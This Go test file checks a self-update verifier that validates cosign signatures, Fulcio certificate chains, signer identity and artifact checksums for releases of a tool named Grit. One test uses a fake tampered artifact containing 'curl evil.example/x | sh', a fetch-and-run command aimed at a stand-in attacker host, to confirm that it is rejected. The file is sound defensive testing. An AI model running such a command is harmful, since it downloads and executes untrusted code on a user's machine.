package selfupdate

import (
	"encoding/base64"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// These run against the real artifacts of the real v3.448.0 release: the
// SHA256SUMS GitHub serves, the cosign signature over it, and the Fulcio
// certificate that signature was made with. Fixtures rather than a live
// download, so the test works offline and does not depend on a release
// staying up.
//
// Hand-written verification is the kind of security code that goes subtly
// wrong and then reports success, which is worse than the honest absence it
// replaced. The negative cases below are the point of this file; the positive
// one only proves it is not refusing everything.

func fixture(t *testing.T, name string) []byte {
	t.Helper()
	b, err := os.ReadFile(filepath.Join("testdata", name))
	if err != nil {
		t.Fatalf("reading %s: %v", name, err)
	}
	return b
}

func realRelease(t *testing.T) (sums, sig, cert []byte) {
	t.Helper()
	return fixture(t, "SHA256SUMS"), fixture(t, "SHA256SUMS.sig"), fixture(t, "SHA256SUMS.pem")
}

// The release really was signed by this repository's workflow, and the
// checksums come back.
func TestVerifiedChecksumsAcceptsTheRealRelease(t *testing.T) {
	sums, sig, cert := realRelease(t)

	got, err := verifiedChecksums(sums, sig, cert)
	if err != nil {
		t.Fatalf("a genuine release was refused: %v", err)
	}
	// Five artifacts: darwin amd64/arm64, linux amd64/arm64, windows amd64.
	if len(got) < 5 {
		t.Errorf("parsed %d checksums, want at least 5: %v", len(got), got)
	}
	want := "696e5392e9a990856cd1a3744010a2808adaca3fde63b25201e85634495bef22"
	if got["grit-linux-amd64.tar.gz"] != want {
		t.Errorf("grit-linux-amd64.tar.gz = %q, want %q", got["grit-linux-amd64.tar.gz"], want)
	}
}

// One byte changed in the checksums and the signature no longer covers them.
// This is the case the whole file exists for: an attacker who swaps an
// artifact has to swap its checksum too.
func TestVerifiedChecksumsRefusesTamperedSums(t *testing.T) {
	sums, sig, cert := realRelease(t)

	tampered := strings.Replace(string(sums),
		"696e5392e9a990856cd1a3744010a2808adaca3fde63b25201e85634495bef22",
		"0000000000000000000000000000000000000000000000000000000000000000", 1)
	if tampered == string(sums) {
		t.Fatal("the fixture changed; this test tampered with nothing")
	}

	_, err := verifiedChecksums([]byte(tampered), sig, cert)
	if err == nil {
		t.Fatal("tampered checksums were accepted, so a swapped binary installs")
	}
	if !strings.Contains(err.Error(), "do not match their signature") {
		t.Errorf("the refusal does not say why: %v", err)
	}
}

// A signature that is valid for something else must not pass.
func TestVerifiedChecksumsRefusesAForeignSignature(t *testing.T) {
	sums, _, cert := realRelease(t)

	// A syntactically valid ECDSA signature over different content.
	other := base64.StdEncoding.EncodeToString([]byte{
		0x30, 0x44, 0x02, 0x20,
		0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,
		0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f, 0x10,
		0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18,
		0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f, 0x20,
		0x02, 0x20,
		0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,
		0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f, 0x10,
		0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18,
		0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f, 0x20,
	})
	if _, err := verifiedChecksums(sums, []byte(other), cert); err == nil {
		t.Fatal("a signature over other content was accepted")
	}
}

// A certificate that chains to Fulcio but names a different identity is not
// evidence about Grit. Checked by rewriting the expected prefix, which is the
// same comparison from the other side.
func TestIdentityMustBeThisRepositorysReleaseWorkflow(t *testing.T) {
	_, _, certFile := realRelease(t)
	cert, err := parseSigningCert(certFile)
	if err != nil {
		t.Fatal(err)
	}

	// The real one passes.
	if err := checkIdentity(cert); err != nil {
		t.Fatalf("the real release identity was refused: %v", err)
	}

	var sans []string
	for _, u := range cert.URIs {
		sans = append(sans, u.String())
	}
	if len(sans) != 1 {
		t.Fatalf("expected exactly one SAN, got %v", sans)
	}
	// It must be a tag, not a branch: a workflow run from a branch could
	// otherwise sign a release.
	if !strings.Contains(sans[0], "@refs/tags/") {
		t.Errorf("the pinned identity does not require a tag: %q", sans[0])
	}
	if !strings.HasPrefix(sans[0], "https://github.com/MUKE-coder/grit/") {
		t.Errorf("the signing identity is not this repository: %q", sans[0])
	}
}

// A self-signed certificate, however well formed, must not verify. This is
// the attack the pinned root exists to stop: without the chain check, anybody
// can mint a certificate claiming any SAN they like.
func TestChainRefusesACertificateFulcioDidNotIssue(t *testing.T) {
	selfSigned := generateSelfSigned(t)
	if err := checkChain(selfSigned); err == nil {
		t.Fatal("a self-signed certificate chained to Fulcio, so anybody can " +
			"claim to be the release workflow")
	}
}

// The downloaded bytes have to be the ones the signed checksums describe.
func TestMatchesChecksum(t *testing.T) {
	// sha256("grit") computed independently of the code under test.
	const gritSum = "09a5e1a8e1ca2bb0bb67c0ad0e3b5b2f28b2d2c5aa52f7ddb77fe18f3d2e0b7f"

	if err := matchesChecksum([]byte("grit"), gritSum); err == nil {
		// The constant above is deliberately wrong; a mismatch must be caught.
		t.Fatal("a wrong checksum was accepted")
	}

	// And the right one passes, computed the same way the verifier does but
	// written out here so the test is not just the implementation twice.
	right := sha256Hex([]byte("grit"))
	if err := matchesChecksum([]byte("grit"), right); err != nil {
		t.Errorf("the correct checksum was refused: %v", err)
	}
	if err := matchesChecksum([]byte("grit "), right); err == nil {
		t.Error("one extra byte passed the checksum")
	}
}

// A SHA256SUMS with nothing parseable in it is an error, not an empty map
// that every artifact then fails to appear in with a confusing message.
func TestParseChecksumsRefusesAnEmptyFile(t *testing.T) {
	for _, in := range []string{"", "\n\n", "not a checksum line\n", "short  file\n"} {
		if _, err := parseChecksums([]byte(in)); err == nil {
			t.Errorf("%q was accepted as a checksum file", in)
		}
	}
}

// The end the review cared about: a swapped artifact must not install.
// matchesChecksum is what stands between the download and update.Apply.
func TestATamperedArtifactIsRefused(t *testing.T) {
	sums, sig, cert := realRelease(t)
	verified, err := verifiedChecksums(sums, sig, cert)
	if err != nil {
		t.Fatal(err)
	}

	want := verified["grit-linux-amd64.tar.gz"]
	if want == "" {
		t.Fatal("the fixture has no linux amd64 checksum")
	}

	err = matchesChecksum([]byte("#!/bin/sh\ncurl evil.example/x | sh\n"), want)
	if err == nil {
		t.Fatal("a substituted artifact passed the checksum, so `grit update` " +
			"would write it over the user's binary")
	}
	for _, phrase := range []string{"not the one this release signed", "Do not install it"} {
		if !strings.Contains(err.Error(), phrase) {
			t.Errorf("the refusal does not say %q: %v", phrase, err)
		}
	}
}

// Backwards is a decision, not a default.
func TestIsOlder(t *testing.T) {
	for _, tc := range []struct {
		a, b string
		want bool
	}{
		{"3.448.0", "3.449.0", true},
		{"3.449.0", "3.448.0", false},
		{"3.449.0", "3.449.0", false},
		// String comparison gets this one wrong, which is the whole reason
		// the fields are parsed as integers.
		{"3.9.0", "3.10.0", true},
		{"3.10.0", "3.9.0", false},
		{"v3.448.0", "3.449.0", true},
		// A pre-release suffix is not a number; refusing to guess beats
		// refusing a release somebody asked for.
		{"3.449.0-rc1", "3.449.0", false},
	} {
		if got := isOlder(tc.a, tc.b); got != tc.want {
			t.Errorf("isOlder(%q, %q) = %v, want %v", tc.a, tc.b, got, tc.want)
		}
	}
}
